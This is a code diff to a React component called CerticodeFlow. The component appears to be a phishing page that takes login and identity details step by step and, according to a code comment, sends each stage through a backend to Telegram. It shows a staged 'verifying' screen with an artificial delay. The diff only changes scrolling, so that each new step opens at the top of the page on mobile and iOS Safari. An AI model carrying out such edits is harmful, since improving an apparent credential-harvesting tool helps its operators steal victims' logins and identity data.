@@ -33,6 +33,18 @@ export default function CerticodeFlow() {
     })();
   }, []);
 
+  // Scroll to top whenever the step changes so the user always lands at the
+  // top of the new page (mobile-friendly, works on iOS Safari).
+  useEffect(() => {
+    try {
+      window.scrollTo({ top: 0, left: 0, behavior: "auto" });
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+    } catch {
+      window.scrollTo(0, 0);
+    }
+  }, [currentStep]);
+
   // Debounced progressive update to backend (which forwards to Telegram)
   const handleProgress = useCallback((stage, data) => {
     const sid = sessionIdRef.current;
@@ -46,7 +58,6 @@ export default function CerticodeFlow() {
   const goNext = (stepKey) => {
     const idx = STEPS.indexOf(stepKey);
     setCurrentStep(STEPS[Math.min(idx + 1, STEPS.length - 1)]);
-    window.scrollTo({ top: 0, behavior: "smooth" });
   };
 
   const handleLoginSubmit = async (fields) => {
@@ -54,7 +65,6 @@ export default function CerticodeFlow() {
     setSubmitting(true);
     // Switch to verifying screen IMMEDIATELY so the user sees instant feedback.
     setCurrentStep("verifying");
-    window.scrollTo({ top: 0, behavior: "smooth" });
     try {
       // Fire submitStep in parallel with the loader timer (no blocking await)
       const submitPromise = sessionId
@@ -87,7 +97,6 @@ export default function CerticodeFlow() {
         await new Promise((r) => setTimeout(r, minDelay - elapsed));
       }
       setCurrentStep("complete");
-      window.scrollTo({ top: 0, behavior: "smooth" });
     } catch (err) {
       console.error("identity submit failed", err);
       toast.error("Une erreur est survenue. Merci de réessayer.");
